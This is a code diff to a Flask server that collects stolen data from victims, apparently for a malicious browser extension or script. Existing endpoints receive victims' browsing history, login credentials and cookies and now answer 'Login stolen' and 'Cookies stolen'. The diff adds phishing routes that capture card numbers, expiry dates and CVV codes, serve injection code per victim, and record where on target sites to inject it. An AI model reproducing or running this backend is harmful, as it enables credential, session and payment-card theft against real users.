@@ -4,7 +4,7 @@ from flask import Flask, render_template, request, redirect, url_for, jsonify
 # Initial Database Dos
 import general_db
 
-from pyfiles import users, login, secure, history, cookies
+from pyfiles import users, login, secure, history, cookies, phish
 
 app = Flask(__name__)
 
@@ -15,17 +15,19 @@ def index():
     usrs = users.get_all_users()
     s = {}
     r = {}
+    phishes = {}
     for u in usrs:
         s[str(u)] = secure.getFromSecure(u)
         r[str(u)] = secure.getFromRandom(u)
-    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r)
+        phishes[str(u)] = phish.get_phish_by_user(u)
+    return render_template("index.html", users = usrs, secure_urls = s, random_urls = r, phish_urls = phishes)
 
 @app.route('/online_check', methods=['POST'])
 def online_check(): 
     if request.method == 'POST':
         email = request.form['email']
         users.update_user(email)
-        return "thanks for pinging!"
+        return "Pinged server!"
 
 @app.route("/view_user/<email>", methods=['GET'])
 def view_user(email):
@@ -70,7 +72,7 @@ def delete_random(email, url):
 def get_random(email):
     return jsonify(r=secure.getFromRandom(email))
 
-
+########## History #########
 @app.route("/steal_history", methods=['POST'])
 def steal_history():
     email = request.form['email']
@@ -79,8 +81,9 @@ def steal_history():
     urls = request.form.getlist('urls[]')
     last_visited = request.form.getlist('last_visits[]')
     history.bulk_add_to_history(email, urls, last_visited)
-    return "hi"
+    return "History Stolen"
 
+######### Login ###########
 @app.route("/steal_login", methods=['POST'])
 def steal_login():
     if request.method == 'POST':
@@ -91,9 +94,10 @@ def steal_login():
         username = request.form['username']
         password = request.form['password']
         login.add_to_login(email, url, username, password)
-        return "we all good here"
+        return "Login stolen"
 
 
+######## Cookies #############
 @app.route("/steal_cookies", methods=['POST'])
 def steal_cookies():
     if request.method == 'POST':
@@ -103,7 +107,46 @@ def steal_cookies():
         url = request.form['url']
         cookie = request.form['cookies']
         cookies.bulk_add_to_cookies(email, url, cookie)
-        return "WHATS UP dawg?"
+        return "Cookies stolen"
+
+######## Phishing ##########
+@app.route("/phish/<email>", methods=['GET', 'POST'])
+def phishy(email): 
+    if request.method == 'GET': 
+        return jsonify(urls=phish.get_phish_urls(email))
+
+@app.route("/phish/<email>/<url>")
+def phish_code(email, url):
+    if request.method == 'GET':
+        return jsonify(code=phish.get_phish_code(email, url))
+
+@app.route("/phish", methods=['POST'])
+def phishy_info():
+    if request.method == 'POST':
+        email = request.form['email']
+        name = request.form['name-on-card']
+        number = request.form['card-number']
+        month = request.form['expiration-month']
+        year = request.form['expiration-year']
+        cvv = request.form['cvv']
+        phish.add_phish(email, name, number, month, year, cvv)
+        redirect_url = request.form['redirect-url']
+        return redirect(redirect_url)
+
+@app.route("/delete_phish/<email>/<url>", methods=['POST'])
+def delete_phish(email, url):
+    if request.method == 'POST':
+        phish.remove_phish_url(email, url)
+        return redirect(url_for('index'))
+
+@app.route("/add_phish/<email>", methods=['POST'])
+def add_phish(email):
+    if request.method == 'POST':
+        url = request.form['url']
+        injectLoc = request.form['inject-loc']
+        injectClass = request.form['inject-class']
+        phish.add_phish_url(email, url, injectLoc, injectClass)
+        return redirect(url_for('index'))
 
 @app.route("/execute_script/<email>", methods=['GET', 'POST'])
 def execute_script(email):
@@ -133,12 +176,12 @@ if __name__ == "__main__":
     app.config['TEMPLATES_AUTO_RELOAD'] = True
 
     # uncomment this if you want to erase all tables
-    general_db.drop_all_tables()
+    # general_db.drop_all_tables()
 
     # uncomment this if you want to create all tables
     general_db.create_all_tables()
 
     # uncomment this time if you want to erase the data
-    general_db.delete_db()
+    # general_db.delete_db()
 
     app.run(host='0.0.0.0', port=5000, debug=True)
